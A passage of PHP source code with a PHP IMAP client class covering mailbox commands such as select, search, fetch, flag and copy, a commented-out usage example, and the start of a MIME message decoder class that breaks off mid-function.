		}
		/* The examin_mailbox command is identical to SELECT and returns the same
		  output; however, the selected mailbox is identified as read-only.*/ 
		function examin_mailbox($mailbox_name)
			{
		  if($this->state=="AUTHORIZATION")
		  {
			$this->error= "Error : User is not authorised or logged in.!<br>";
			return false;
		  }
		  if($this->put_line($this->tag." EXAMINE $mailbox_name"))
			{
				$response=$this->get_server_responce();
				if(substr($response,strpos($response,"$this->tag ")+strlen($this->tag)+1,2)!="OK")
				{
					$this->error= "Error : $response !<br>";
					return false;
				}
			}
			else
			{
				$this->error= "Error : Could not send User request. <br>";
				return false;
			}
			$this->state="SELECTED";
			return $response;
		}
			/* This function create a mail box*/
		function create_mailbox($mailbox_name)
			{
			if($this->state=="AUTHORIZATION")
			{
			$this->error= "Error : User is not authorised or logged in.!<br>";
			return false;
			}
			if($this->put_line($this->tag." CREATE $mailbox_name"))
			{
				$response=$this->get_server_responce();
				if(substr($response,strpos($response,"$this->tag ")+strlen($this->tag)+1,2)!="OK")
				{
					$this->error= "Error : $response !<br>";
					return false;
				}
			}
			else
			{
				$this->error= "Error : Could not send User request. <br>";
				return false;
			}
			return "Mailbox $mailbox_name created.";
		}
	
			/* This function delete exists mail box*/
		function delete_mailbox($mailbox_name)
		{
			if($this->state=="AUTHORIZATION")
			{
					$this->error= "Error : User is not authorised or logged in.!<br>";
					return false;
			}
			if($this->put_line($this->tag." DELETE $mailbox_name"))
			{
				$response=$this->get_server_responce();
				if(substr($response,strpos($response,"$this->tag ")+strlen($this->tag)+1,2)!="OK")
				{
					$this->error= "Error : $response !<br>";
					return false;
				}
			}
			else
			{
				$this->error= "Error : Could not send User request. <br>";
				return false;
			}
			return "Mailbox $mailbox_name deleted.";
		}
	
			/* This function rename exists mail box*/
		function rename_mailbox($old_mailbox_name,$new_mailbox_name)
		{
			if($this->state=="AUTHORIZATION")
			{
			$this->error= "Error : User is not authorised or logged in.!<br>";
			return false;
			}
			if($this->put_line($this->tag." RENAME $old_mailbox_name $new_mailbox_name"))
			{
				$response=$this->get_server_responce();
				if(substr($response,strpos($response,"$this->tag ")+strlen($this->tag)+1,2)!="OK")
				{
					$this->error= "Error : $response !<br>";
					return false;
				}
			}
			else
			{
				$this->error= "Error : Could not send User request. <br>";
				return false;
			}
			return "Mailbox $mailbox_name deleted.";
		}
			/* The subscribe_mailbox command adds the specified mailbox name to the
		  server's set of "active" or "subscribed" mailboxes */
		function subscribe_mailbox($mailbox_name)
		{
			if($this->state=="AUTHORIZATION")
			{
				$this->error= "Error : User is not authorised or logged in.!<br>";
				return false;
			}
			if($this->put_line($this->tag." SUBSCRIBE $mailbox_name"))
			{
				$response=$this->get_server_responce();
				if(substr($response,strpos($response,"$this->tag ")+strlen($this->tag)+1,2)!="OK")
				{
					$this->error= "Error : $response !<br>";
					return false;
				}
			}
			else
			{
				$this->error= "Error : Could not send User request. <br>";
				return false;
			}
			return "Mailbox $mailbox_name subscribed.";
		}
			/* The subscribe_mailbox command removes the specified mailbox name to the
		  server's set of "active" or "subscribed" mailboxes */
		function unsubscribe_mailbox($mailbox_name)
		{
			if($this->state=="AUTHORIZATION")
			{
				$this->error= "Error : User is not authorised or logged in.!<br>";
				return false;
			}
			if($this->put_line($this->tag." UNSUBSCRIBE $mailbox_name"))
			{
				$response=$this->get_server_responce();
				if(substr($response,strpos($response,"$this->tag ")+strlen($this->tag)+1,2)!="OK")
				{
					$this->error= "Error : $response !<br>";
					return false;
				}
			}
			else
			{
				$this->error= "Error : Could not send User request. <br>";
				return false;
			}
			return "Mailbox $mailbox_name unsubscribed.";
		}
	
		/* The list_mailbox command gets the specified list of mailbox
		  
					$ref_mail_box $wild_card   Interpretation
					Reference    Mailbox Name  Interpretation
				   ------------  ------------  --------------
				   ~smith/Mail/  foo.*         ~smith/Mail/foo.*
				   archive/      %             archive/%
				   #news.        comp.mail.*   #news.comp.mail.*
				   ~smith/Mail/  /usr/doc/foo  /usr/doc/foo
				   archive/      ~fred/Mail/*  ~fred/Mail/*
	  */
		function list_mailbox($ref_mail_box="",$wild_card="*")
		{
			if($this->state=="AUTHORIZATION")
			{
				$this->error= "Error : User is not authorised or logged in.!<br>";
				return false;
			}
			if(trim($ref_mail_box)=="")
				$ref_mail_box="\"\"";
			if($this->put_line($this->tag." LIST $ref_mail_box $wild_card"))
			{
				$response=$this->get_server_responce();
				if(substr($response,strpos($response,"$this->tag ")+strlen($this->tag)+1,2)!="OK")
				{
					$this->error= "Error : $response !<br>";
					return false;
				}
			}
			else
			{
				$this->error= "Error : Could not send User request. <br>";
				return false;
			}
			$temp_arr=explode("\r\n",$response);
			$return_arr=array();
			for($i=0;$i<count($temp_arr)-1;$i++)
			{
				$line=$temp_arr[$i];
				array_push($return_arr,substr($line,strrpos($line," ")));
			}
			return $return_arr;
		}
		
		//function is same as list_mailbox rather than it returns active mail box list
		function list_subscribed_mailbox($ref_mail_box="",$wild_card="*")
		{
			if($this->state=="AUTHORIZATION")
			{
				$this->error= "Error : User is not authorised or logged in.!<br>";
				return false;
			}
			if(trim($ref_mail_box)=="")
				$ref_mail_box="\"\"";
			if($this->put_line($this->tag." LSUB $ref_mail_box $wild_card"))
			{
				$response=$this->get_server_responce();
				if(substr($response,strpos($response,"$this->tag ")+strlen($this->tag)+1,2)!="OK")
				{
					$this->error= "Error : $response !<br>";
					return false;
				}
			}
			else
			{
				$this->error= "Error : Could not send User request. <br>";
				return false;
			}
			$temp_arr=explode("\r\n",$response);
			$return_arr=array();
			for($i=0;$i<count($temp_arr)-1;$i++)
			{
				$line=$temp_arr[$i];
				array_push($return_arr,substr($line,strrpos($line," ")));
			}
			return $return_arr;
		}
	
		//function is same as list_mailbox rather than it returns active mail box list
		function get_status($mail_box,$status_cmd)
		{
			if($this->state=="AUTHORIZATION")
			{
				$this->error= "Error : User is not authorised or logged in.!<br>";
				return false;
			}
			if($this->put_line($this->tag." STATUS $mail_box ($status_cmd)"))
			{
				$response=$this->get_server_responce();
				if(substr($response,strpos($response,"$this->tag ")+strlen($this->tag)+1,2)!="OK")
				{
					$this->error= "Error : $response !<br>";
					return false;
				}
			}
			else
			{
				$this->error= "Error : Could not send User request. <br>";
				return false;
			}
			return $response;
		}

		/* The CHECK command requests a checkpoint of the currently selected
		mailbox.  A checkpoint refers to any implementation-dependent
		housekeeping associated with the mailbox */
		function  check_mailbox()
		{
			if($this->state!="SELECTED")
			{
				$this->error= "Error : No mail box is selected.!<br>";
				return false;
			}
			if($this->put_line($this->tag." CHECK"))
			{
				$response=$this->get_server_responce();
				if(substr($response,strpos($response,"$this->tag ")+strlen($this->tag)+1,2)!="OK")
				{
					$this->error= "Error : $response !<br>";
					return false;
				}
			}
			else
			{
				$this->error= "Error : Could not send User request. <br>";
				return false;
			}
			return $response;
		}


		/* The close_mailbox command permanently removes from the currently selected
      mailbox all messages that have the \Deleted flag set, and returns
      to authenticated state from selected state.  No untagged EXPUNGE
      responses are sent.
		*/
		function  close_mailbox()
		{
			if($this->state!="SELECTED")
			{
				$this->error= "Error : No mail box is selected.!<br>";
				return false;
			}
			if($this->put_line($this->tag." CLOSE"))
			{
				$response=$this->get_server_responce();
				if(substr($response,strpos($response,"$this->tag ")+strlen($this->tag)+1,2)!="OK")
				{
					$this->error= "Error : $response !<br>";
					return false;
				}
			}
			else
			{
				$this->error= "Error : Could not send User request. <br>";
				return false;
			}
			return $response;
		}

	 /* The expunge_mailbox command permanently removes from the currently selected
      mailbox all messages that have the \Deleted flag set, and returns
      to authenticated state from selected state.  tagged EXPUNGE
      responses are sent.
		*/
		
		function  expunge_mailbox()
		{
			if($this->state!="SELECTED")
			{
				$this->error= "Error : No mail box is selected.!<br>";
				return false;
			}
			if($this->put_line($this->tag." EXPUNGE "))
			{
				$response=$this->get_server_responce();
				if(substr($response,strpos($response,"$this->tag ")+strlen($this->tag)+1,2)!="OK")
				{
					$this->error= "Error : $response !<br>";
					return false;
				}
			}
			else
			{
				$this->error= "Error : Could not send User request. <br>";
				return false;
			}
			return $response;
		}

			/* The search_mailbox command  searches the mailbox for messages that match
				the given searching criteria.  Searching criteria consist of one
				or more search keys. 
				  The defined search keys are as follows.  Refer to the Formal
				  Syntax section for the precise syntactic definitions of the
				  arguments.
			
				  <message set>  Messages with message sequence numbers
								 corresponding to the specified message sequence
								 number set
			
				  ALL            All messages in the mailbox; the default initial
								 key for ANDing.
			
				  ANSWERED       Messages with the \Answered flag set.
			
				  BCC <string>   Messages that contain the specified string in the
								 envelope structure's BCC field.
			
				  BEFORE <date>  Messages whose internal date is earlier than the
								 specified date.
			
				  BODY <string>  Messages that contain the specified string in the
								 body of the message.
			
				  CC <string>    Messages that contain the specified string in the
								 envelope structure's CC field.
			
				  DELETED        Messages with the \Deleted flag set.
			
				  DRAFT          Messages with the \Draft flag set.
			
				  FLAGGED        Messages with the \Flagged flag set.
			
				  FROM <string>  Messages that contain the specified string in the
								 envelope structure's FROM field.
			
				  HEADER <field-name> <string>
								 Messages that have a header with the specified
								 field-name (as defined in [RFC-822]) and that
								 contains the specified string in the [RFC-822]
								 field-body.
			
				  KEYWORD <flag> Messages with the specified keyword set.
			
				  LARGER <n>     Messages with an [RFC-822] size larger than the
								 specified number of octets.
			
				  NEW            Messages that have the \Recent flag set but not the
								 \Seen flag.  This is functionally equivalent to
								 "(RECENT UNSEEN)".
			
				  NOT <search-key>
								 Messages that do not match the specified search
								 key.
			
				  OLD            Messages that do not have the \Recent flag set.
								 This is functionally equivalent to "NOT RECENT" (as
								 opposed to "NOT NEW").
			
				  ON <date>      Messages whose internal date is within the
								 specified date.
			
				  OR <search-key1> <search-key2>
								 Messages that match either search key.
			
				  RECENT         Messages that have the \Recent flag set.
			
				  SEEN           Messages that have the \Seen flag set.
			
				  SENTBEFORE <date>
								 Messages whose [RFC-822] Date: header is earlier
								 than the specified date.
			
				  SENTON <date>  Messages whose [RFC-822] Date: header is within the
								 specified date.
			
				  SENTSINCE <date>
								 Messages whose [RFC-822] Date: header is within or
								 later than the specified date.
			
				  SINCE <date>   Messages whose internal date is within or later
								 than the specified date.
			
				  SMALLER <n>    Messages with an [RFC-822] size smaller than the
								 specified number of octets.
			
				  SUBJECT <string>
								 Messages that contain the specified string in the
								 envelope structure's SUBJECT field.
			
				  TEXT <string>  Messages that contain the specified string in the
								 header or body of the message.
			
				  TO <string>    Messages that contain the specified string in the
								 envelope structure's TO field.
			
				  UID <message set>
								 Messages with unique identifiers corresponding to
								 the specified unique identifier set.
			
				  UNANSWERED     Messages that do not have the \Answered flag set.
			
				  UNDELETED      Messages that do not have the \Deleted flag set.
			
				  UNDRAFT        Messages that do not have the \Draft flag set.
			
				  UNFLAGGED      Messages that do not have the \Flagged flag set.
			
				  UNKEYWORD <flag>
								 Messages that do not have the specified keyword
								 set.
			
				  UNSEEN         Messages that do not have the \Seen flag set.
			
			   Example:    search_mailbox("FLAGGED SINCE 1-Feb-1994 NOT FROM \"Smith\"")
				  
		*/
		
		function search_mailbox($search_cri,$charset="")
		{
			if($this->state!="SELECTED")
			{
				$this->error= "Error : No mail box is selected.!<br>";
				return false;
			}
			$search_cri =trim($search_cri);
			if(trim($charset)!="")
				$charset="CHARSET \"".trim(addslashes($charset))."\" ";	
			if($this->put_line($this->tag." SEARCH $charset$search_cri"))
			{
				$response=$this->get_server_responce();
				if(substr($response,strpos($response,"$this->tag ")+strlen($this->tag)+1,2)!="OK")
				{
					$this->error= "Error : $response !<br>";
					return false;
				}
			}
			else
			{
				$this->error= "Error : Could not send User request. <br>";
				return false;
			}
			$return=array();
			$temp_arr=explode("\r\n",$response);
			foreach($temp_arr as $line)
			if (substr($line, 0, 9) == "* SEARCH ") 
				$return = array_merge($return,explode(" ",substr($line, 9)));
			return $return;
		}
		
		/*The uid_search_mailbox as same as above but diffrence is that
			it takes uid number as $msg_set;
		*/
		
		function uid_search_mailbox($search_cri,$charset="")
		{
			if($this->state!="SELECTED")
			{
				$this->error= "Error : No mail box is selected.!<br>";
				return false;
			}
			$search_cri =trim($search_cri);
			if(trim($charset)!="")
				$charset="CHARSET \"".trim(addslashes($charset))."\" ";	
			if($this->put_line($this->tag." UID SEARCH $charset$search_cri"))
			{
				$response=$this->get_server_responce();
				if(substr($response,strpos($response,"$this->tag ")+strlen($this->tag)+1,2)!="OK")
				{
					$this->error= "Error : $response !<br>";
					return false;
				}
			}
			else
			{
				$this->error= "Error : Could not send User request. <br>";
				return false;
			}
			$return=array();
			$temp_arr=explode("\r\n",$response);
			foreach($temp_arr as $line)
			if (substr($line, 0, 9) == "* SEARCH ") 
				$return = array_merge($return,explode(" ",substr($line, 9)));
			return $return;
		}
		
		/*
		The fetch_mail function retrieves data associated with a message in the
		mailbox.  The data items to be fetched can be either a single atom
		or a parenthesized list.
		
		ALL            Macro equivalent to: (FLAGS INTERNALDATE RFC822.SIZE ENVELOPE)
		
		BODY           Non-extensible form of BODYSTRUCTURE.
		
		BODY[<section>]<<partial>>
		
		BODY.PEEK[<section>]<<partial>>
					 An alternate form of BODY[<section>] that does not
					 implicitly set the \Seen flag.
		
		BODYSTRUCTURE  The [MIME-IMB] body structure of the message.  This
					 is computed by the server by parsing the [MIME-IMB]
					 header fields in the [RFC-822] header and
					 [MIME-IMB] headers.
		
		ENVELOPE       The envelope structure of the message.  This is
					 computed by the server by parsing the [RFC-822]
					 header into the component parts, defaulting various
					 fields as necessary.
		
		FAST         Macro equivalent to: (FLAGS INTERNALDATE RFC822.SIZE)
		
		FLAGS       The flags that are set for this message.
		
		FULL        Macro equivalent to: (FLAGS INTERNALDATE RFC822.SIZE ENVELOPE BODY)
		
		INTERNALDATE   The internal date of the message.
		
		RFC822      Functionally equivalent to BODY[], differing in the
					 syntax of the resulting untagged FETCH data (RFC822
					 is returned).
		
		RFC822.HEADER  Functionally equivalent to BODY.PEEK[HEADER],
					 differing in the syntax of the resulting untagged
					 FETCH data (RFC822.HEADER is returned).
		
		RFC822.SIZE The [RFC-822] size of the message.
		
		RFC822.TEXT  Functionally equivalent to BODY[TEXT], differing in
					 the syntax of the resulting untagged FETCH data
					 (RFC822.TEXT is returned).
		
		UID            The unique identifier for the message.
		
		Example : fetch_mail( 2:4 (FLAGS BODY[HEADER.FIELDS (DATE FROM)])
		*/

		function  fetch_mail($msg_set,$msg_data_name)
		{
			if($this->state!="SELECTED")
			{
				$this->error= "Error : No mail box is selected.!<br>";
				return false;
			}
			$msg_set =trim($msg_set);
			$msg_data_name =trim($msg_data_name);
			if($this->put_line($this->tag." FETCH $msg_set ($msg_data_name)"))
			{
				$response=$this->get_server_responce();
				if(substr($response,strpos($response,"$this->tag ")+strlen($this->tag)+1,2)!="OK")
				{
					$this->error= "Error : $response !<br>";
					return false;
				}
			}
			else
			{
				$this->error= "Error : Could not send User request. <br>";
				return false;
			}
			return $response;
		}

		/*The uid_fetch_mail as same as above but diffrence is that
			it takes uid number as $msg_set;
		*/

		function  uid_fetch_mail($msg_set,$msg_data_name)
		{
			if($this->state!="SELECTED")
			{
				$this->error= "Error : No mail box is selected.!<br>";
				return false;
			}
			$msg_set =trim($msg_set);
			$msg_data_name =trim($msg_data_name);
			if($this->put_line($this->tag." UID FETCH $msg_set ($msg_data_name)"))
			{
				$response=$this->get_server_responce();
				if(substr($response,strpos($response,"$this->tag ")+strlen($this->tag)+1,2)!="OK")
				{
					$this->error= "Error : $response !<br>";
					return false;
				}
			}
			else
			{
				$this->error= "Error : Could not send User request. <br>";
				return false;
			}
			return $response;
		}

		/*
			  The store_mail_flag function alters data associated with a message in the
			  mailbox.  Normally, store_mail_flag will return the updated value of the
			  data with an untagged FETCH response.  A suffix of ".SILENT" in
			  the data item name prevents the untagged FETCH, and the server
			  SHOULD assume that the client has determined the updated value
			  itself or does not care about the updated value.
			   The currently defined data items that can be stored are:

			  FLAGS <flag list>	Replace the flags for the message with the
							 argument.  The new value of the flags are returned
							 as if a FETCH of those flags was done.
		
			  FLAGS.SILENT <flag list> 
							 Equivalent to FLAGS, but without returning a new value.
		
			  +FLAGS <flag list>
							 Add the argument to the flags for the message.  The
							 new value of the flags are returned as if a FETCH
							 of those flags was done.
		
			  +FLAGS.SILENT <flag list>
							 Equivalent to +FLAGS, but without returning a new
							 value.
		
			  -FLAGS <flag list>
							 Remove the argument from the flags for the message.
							 The new value of the flags are returned as if a
							 FETCH of those flags was done.
		
			  -FLAGS.SILENT <flag list>
							 Equivalent to -FLAGS, but without returning a new
							 value.
		
			  Example :store_mail_flag("3","+FLAGS","Seen");
		*/

		function  store_mail_flag($msg_set,$msg_data_name,$value)
		{
			if($this->state!="SELECTED")
			{
				$this->error= "Error : No mail box is selected.!<br>";
				return false;
			}
			$msg_set =trim($msg_set);
			$msg_data_name =trim($msg_data_name);
			$value =trim($value);
			if($this->put_line($this->tag." STORE $msg_set $msg_data_name ($value)"))
			{
				$response=$this->get_server_responce();
				if(substr($response,strpos($response,"$this->tag ")+strlen($this->tag)+1,2)!="OK")
				{
					$this->error= "Error : $response !<br>";
					return false;
				}
			}
			else
			{
				$this->error= "Error : Could not send User request. <br>";
				return false;
			}
			return $response;
		}
		
		/*The uid_store_mail_flag as same as above but diffrence is that
			it takes uid number as $msg_set;
		*/

		function  uid_store_mail_flag($msg_set,$msg_data_name,$value)
		{
			if($this->state!="SELECTED")
			{
				$this->error= "Error : No mail box is selected.!<br>";
				return false;
			}
			$msg_set =trim($msg_set);
			$msg_data_name =trim($msg_data_name);
			$value =trim($value);
			if($this->put_line($this->tag." UID STORE $msg_set $msg_data_name (\\$value)"))
			{
				$response=$this->get_server_responce();
				if(substr($response,strpos($response,"$this->tag ")+strlen($this->tag)+1,2)!="OK")
				{
					$this->error= "Error : $response !<br>";
					return false;
				}
			}
			else
			{
				$this->error= "Error : Could not send User request. <br>";
				return false;
			}
			return $response;
		}

		/* The copy_mail command copies the specified message(s) to the end of the
			specified destination mailbox
			Example : copy_mail("2:4","TEST")
			*/	

		function  copy_mail($msg_set,$mailbox)
		{
			if($this->state!="SELECTED")
			{
				$this->error= "Error : No mail box is selected.!<br>";
				return false;
			}
			$msg_set =trim($msg_set);
			$mailbox =trim($mailbox);
			if($this->put_line($this->tag." COPY $msg_set $mailbox"))
			{
				$response=$this->get_server_responce();
				if(substr($response,strpos($response,"$this->tag ")+strlen($this->tag)+1,2)!="OK")
				{
					$this->error= "Error : $response !<br>";
					return false;
				}
			}
			else
			{
				$this->error= "Error : Could not send User request. <br>";
				return false;
			}
			return $response;
		}
		
		/*The uid_copy_mail as same as above but diffrence is that
			it takes uid number as $msg_set;
		*/

		function  uid_copy_mail($msg_set,$mailbox)
		{
			if($this->state!="SELECTED")
			{
				$this->error= "Error : No mail box is selected.!<br>";
				return false;
			}
			$msg_set =trim($msg_set);
			$mailbox =trim($mailbox);
			if($this->put_line($this->tag." UID COPY $msg_set $mailbox"))
			{
				$response=$this->get_server_responce();
				if(substr($response,strpos($response,"$this->tag ")+strlen($this->tag)+1,2)!="OK")
				{
					$this->error= "Error : $response !<br>";
					return false;
				}
			}
			else
			{
				$this->error= "Error : Could not send User request. <br>";
				return false;
			}
			return $response;
		}

	}

?>
<?php 

	    /**
	include_once("imap.inc.php");
	include_once("mimedecode.inc.php");
	$imap=new IMAPMAIL;
	if(!$imap->open("192.168.0.26","143"))
	{
		echo $imap->get_error();
		exit;
	} 

	$imap->login("harishc","hchauhan");
	echo $imap->error;
	$response=$imap->open_mailbox("INBOX");
	echo $imap->error;
	//echo $response=$imap->get_msglist();
	//echo $response=$imap->delete_message(9);
	//echo $response=$imap->rollback_delete(9);
	$response=$imap->get_message(1);


	///Decoding the mail	

	$mimedecoder=new MIMEDECODE($response,"\r\n");
	$msg=$mimedecoder->get_parsed_message();
	print_r($msg);
	//echo nl2br($response);
	echo $imap->get_error();
	$imap->close();
	//$response=$imap->fetch_mail("3","BODYSTRUCTURE");
	//print_r($response);
	//echo nl2br($response);
	//echo $imap->error;
	echo "<br>";
	     */

?>

<?php 

	class MIMEDECODE 
	{
	
	    /**
	     * The raw email to decode
	     * @var    string
	     */
	    var $_input;
	
	    /**
	     * The header part of the input
	     * @var    string
	     */
	    var $_header;
	
	    /**
	     * The body part of the input
	     * @var    string
	     */
	    var $_body;
	
	    /**
	     * If an error occurs, this is used to store the message
	     * @var    string
	     */
	    var $_error;
	
	    /**
	     * Flag to determine whether to include bodies in the
	     * returned object.
	     * @var    boolean
	     */
	    var $_include_bodies;
	
	    /**
	     * Flag to determine whether to decode bodies
	     * @var    boolean
	     */
	    var $_decode_bodies;
	
	    /**
	     * Flag to determine whether to decode headers
	     * @var    boolean
	     */
	    var $_decode_headers;
	
	    /**
	    * If invoked from a class, $this will be set. This has problematic
	    * connotations for calling decode() statically. Hence this variable
	    * is used to determine if we are indeed being called statically or
	    * via an object.
	    */
	    var $mailMimeDecode;
	
	    /**
	     * Constructor.
	     *
	     * Sets up the object, initialise the variables, and splits and
	     * stores the header and body of the input.
	     *
	     * @param string The input to decode
	     * @access public
	     */
	    function MIMEDECODE($input)
	    {
	        list($header, $body)   = $this->_split_body_header($input);
	
	        $this->_input          = $input;
	        $this->_header         = $header;
	        $this->_body           = $body;
	        $this->_decode_bodies  = true;
	        $this->_include_bodies = true;
	        
	        $this->mailMimeDecode  = true;
	    }
	
	    /**
	     * Begins the decoding process. If called statically
	     * it will create an object and call the decode() method
	     * of it.
	     *
	     * @param array An array of various parameters that determine
	     *              various things:
	     *              include_bodies - Whether to include the body in the returned
	     *                               object.
	     *              decode_bodies  - Whether to decode the bodies
	     *                               of the parts. (Transfer encoding)
	     *              decode_headers - Whether to decode headers
	     *              input          - If called statically, this will be treated
	     *                               as the input
	     * @return object Decoded results
	     * @access public
	     */
	    function decode($params = null)
	    {
	
	        // Have we been called statically? If so, create an object and pass details to that.
	        if (!isset($this->mailMimeDecode) AND isset($params['input'])) {
	
	            $obj = new MIMEDECODE($params['input']);
	            $structure = $obj->decode($params);
	
	        // Called statically but no input
	        } elseif (!isset($this->mailMimeDecode)) {
	            return $this->_error='Called statically and no input given';
	
	        // Called via an object
	        } else {
	
	            //$this->_include_bodies = isset($params['include_bodies'])  ? $params['include_bodies']  : false;
	            //$this->_decode_bodies  = isset($params['decode_bodies'])   ? $params['decode_bodies']   : false;
	            //$this->_decode_headers = isset($params['decode_headers'])  ? $params['decode_headers']  : false;
	
	            $structure = $this->_decode($this->_header, $this->_body);
	            if ($structure === false) {
	                $structure =$this->_error;
	            }
	        }
	
	        return $structure;
	    }
	
	    /**
	     * Performs the decoding. Decodes the body string passed to it
	     * If it finds certain content-types it will call itself in a
	     * recursive fashion
	     *
	     * @param string Header section
	     * @param string Body section
	     * @return object Results of decoding process
	     * @access private
	     */
	    function _decode($headers, $body, $default_ctype = 'text/plain')
	    {
	        $return = new stdClass;
	        $headers = $this->_parseHeaders($headers);
	
	        foreach ($headers as $value) {
	            if (isset($return->headers[strtolower($value['name'])]) AND !is_array($return->headers[strtolower($value['name'])])) {
	                $return->headers[strtolower($value['name'])]   = array($return->headers[strtolower($value['name'])]);
	                $return->headers[strtolower($value['name'])][] = $value['value'];
	
	            } elseif (isset($return->headers[strtolower($value['name'])])) {
	                $return->headers[strtolower($value['name'])][] = $value['value'];
	
	            } else {
	                $return->headers[strtolower($value['name'])] = $value['value'];
	            }
	        }
	
	        reset($headers);
	        while (list($key, $value) = each($headers)) {
	            $headers[$key]['name'] = strtolower($headers[$key]['name']);
	            switch ($headers[$key]['name']) {
	
	                case 'content-type':
	                    $content_type = $this->_parseHeaderValue($headers[$key]['value']);
	
	                    if (preg_match('/([0-9a-z+.-]+)\/([0-9a-z+.-]+)/i', $content_type['value'], $regs)) {
	                        $return->ctype_primary   = $regs[1];
	                        $return->ctype_secondary = $regs[2];
	                    }
	
	                    if (isset($content_type['other'])) {
	                        while (list($p_name, $p_value) = each($content_type['other'])) {
	                            $return->ctype_parameters[$p_name] = $p_value;
	                        }
	                    }
	                    break;
	
	                case 'content-disposition';
	                    $content_disposition = $this->_parseHeaderValue($headers[$key]['value']);
	                    $return->disposition   = $content_disposition['value'];
	                    if (isset($content_disposition['other'])) {
	                        while (list($p_name, $p_value) = each($content_disposition['other'])) {
	                            $return->d_parameters[$p_name] = $p_value;
	                        }
	                    }
	                    break;
	
	                case 'content-transfer-encoding':
	                    $content_transfer_encoding = $this->_parseHeaderValue($headers[$key]['value']);
	                    break;
	            }
	        }
	
	        if (isset($content_type)) {
	            switch (trim(strtolower($content_type['value']))) {
	                case 'text/plain':
	                    $encoding = isset($content_transfer_encoding) ? $content_transfer_encoding['value'] : '7bit';
	                    $this->_include_bodies ? $return->body = ($this->_decode_bodies ? $this->_decodeBody($body, $encoding) : $body) : null;
	                    break;
	                case 'text/html':
	                    $encoding = isset($content_transfer_encoding) ? $content_transfer_encoding['value'] : '7bit';
	                    $this->_include_bodies ? $return->body = ($this->_decode_bodies ? $this->_decodeBody($body, $encoding) : $body) : null;
					    break;
	
	                case 'multipart/parallel':
	                case 'multipart/report': // RFC1892
	                case 'multipart/signed': // PGP
	                case 'multipart/digest':
	                case 'multipart/alternative':
	                case 'multipart/related':
	                case 'multipart/mixed':
	                    if(!isset($content_type['other']['boundary'])){
	                        $this->_error = 'No boundary found for ' . $content_type['value'] . ' part';
	                        return false;
	                    }
	
	                    $default_ctype = (strtolower($content_type['value']) === 'multipart/digest') ? 'message/rfc822' : 'text/plain';
						
	                    $parts = $this->_boundarySplit($body, $content_type['other']['boundary']);
	                    for ($i = 0; $i < count($parts); $i++) {
	                        list($part_header, $part_body) = $this->_split_body_header($parts[$i]);
	                        $part = $this->_decode($part_header, $part_body, $default_ctype);
	                        if($part === false)
	                            $part = $this->raiseError($this->_error);
	                        $return->parts[] = $part;
	                    }
	                    break;
	
	                case 'message/rfc822':
	                    $obj = new MIMEDECODE($body);
	                    $return->parts[] = $obj->decode(array('include_bodies' => $this->_include_bodies));
	                    unset($obj);
	                    break;
	
	                default:
	                    if(!isset($content_transfer_encoding['value']))
	                        $content_transfer_encoding['value'] = '7bit';
	                    $this->_include_bodies ? $return->body = ($this->_decode_bodies ? $this->_decodeBody($body, $content_transfer_encoding['value']) : $body) : null;
	                    break;
	            }
	
	        } else {
	            $ctype = explode('/', $default_ctype);
	            $return->ctype_primary   = $ctype[0];
	            $return->ctype_secondary = $ctype[1];
	            $this->_include_bodies ? $return->body = ($this->_decode_bodies ? $this->_decodeBody($body) : $body) : null;
	        }
	
	        return $return;
	    }
	
	    /**
	     * Given the output of the above function, this will return an
	     * array of references to the parts, indexed by mime number.
	     *
	     * @param  object $structure   The structure to go through
	     * @param  string $mime_number Internal use only.
	     * @return array               Mime numbers
	     */
	    function &getMimeNumbers(&$structure, $no_refs = false, $mime_number = '', $prepend = '')
	    {
	        $return = array();
	        if (!empty($structure->parts)) {
	            if ($mime_number != '') {
	                $structure->mime_id = $prepend . $mime_number;
	                $return[$prepend . $mime_number] = &$structure;
	            }
	            for ($i = 0; $i < count($structure->parts); $i++) {
	
	            
	                if (!empty($structure->headers['content-type']) AND substr(strtolower($structure->headers['content-type']), 0, 8) == 'message/') {
	                    $prepend      = $prepend . $mime_number . '.';
	                    $_mime_number = '';
	                } else {
	                    $_mime_number = ($mime_number == '' ? $i + 1 : sprintf('%s.%s', $mime_number, $i + 1));
	                }
	
	                $arr = &MIMEDECODE::getMimeNumbers($structure->parts[$i], $no_refs, $_mime_number, $prepend);
	                foreach ($arr as $key => $val) {
	                    $no_refs ? $return[$key] = '' : $return[$key] = &$arr[$key];
	                }
	            }
	        } else {
	            if ($mime_number == '') {
	                $mime_number = '1';
	            }
	            $structure->mime_id = $prepend . $mime_number;
	            $no_refs ? $return[$prepend . $mime_number] = '' : $return[$prepend . $mime_number] = &$structure;
	        }
	        
	        return $return;
	    }
	
	    /**
	     * Given a string containing a header and body
	     * section, this function will split them (at the first
	     * blank line) and return them.
	     *
	     * @param string Input to split apart
	     * @return array Contains header and body section
	     * @access private
	     */
	    function _split_body_header($input)
	    {
	        if (preg_match("/^(.*?)\r?\n\r?\n(.*)/s", $input, $match)) {
	            return array($match[1], $match[2]);
	        }
	        $this->_error = 'Could not split header and body';
	        return false;
	    }
	
	    /**
	     * Parse headers given in $input and return
	     * as assoc array.
	     *
	     * @param string Headers to parse
	     * @return array Contains parsed headers
	     * @access private
	     */
	    function _parseHeaders($input)
	    {
	
	        if ($input !== '') {
	            // Unfold the input
	            $input   = preg_replace("/\r?\n/", "\r\n", $input);
	            $input   = preg_replace("/\r\n(\t| )+/", ' ', $input);
	            $headers = explode("\r\n", trim($input));
	
	            foreach ($headers as $value) {
	                $hdr_name = substr($value, 0, $pos = strpos($value, ':'));
	                $hdr_value = substr($value, $pos+1);
	                if($hdr_value[0] == ' ')
	                    $hdr_value = substr($hdr_value, 1);
	
	                $return[] = array(
	                                  'name'  => $hdr_name,
	                                  'value' => $this->_decode_headers ? $this->_decodeHeader($hdr_value) : $hdr_value
	                                 );
	            }
	        } else {
	            $return = array();
	        }
	
	        return $return;
	    }
	
	    /**
	     * Function to parse a header value,
	     * extract first part, and any secondary
	     * parts (after ;) This function is not as
	     * robust as it could be. Eg. header comments
	     * in the wrong place will probably break it.
	     *
	     * @param string Header value to parse
	     * @return array Contains parsed result
	     * @access private
	     */
	    function _parseHeaderValue($input)
	    {
	
	        if (($pos = strpos($input, ';')) !== false) {
	
	            $return['value'] = trim(substr($input, 0, $pos));
	            $input = trim(substr($input, $pos+1));
	
	            if (strlen($input) > 0) {
	
	                // This splits on a semi-colon, if there's no preceeding backslash
	                // Can't handle if it's in double quotes however. (Of course anyone
	                // sending that needs a good slap).
	                $parameters = preg_split('/\s*(?<!\\\\);\s*/i', $input);
	
	                for ($i = 0; $i < count($parameters); $i++) {
